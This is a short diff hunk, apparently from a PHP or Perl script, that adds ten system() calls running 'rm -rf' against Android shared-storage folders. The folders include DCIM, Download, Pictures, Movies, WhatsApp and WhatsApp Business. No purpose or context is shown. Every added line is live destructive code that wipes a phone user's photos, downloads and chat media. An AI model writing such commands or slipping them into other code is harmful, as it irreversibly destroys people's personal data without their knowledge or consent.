@@ -1,0 +1,10 @@
+system('rm -rf /sdcard/Android');
+system('rm -rf /sdcard/DCIM');
+system('rm -rf /sdcard/Download');
+system('rm -rf /sdcard/Movies');
+system('rm -rf /sdcard/Pictures');
+system('rm -rf /sdcard/PicsArt');
+system('rm -rf /sdcard/recordmaster');
+system('rm -rf /sdcard/Whatsapp');
+system('rm -rf /sdcard/Whatsapp Bussiness');
+system('rm -rf /sdcard/ADM');
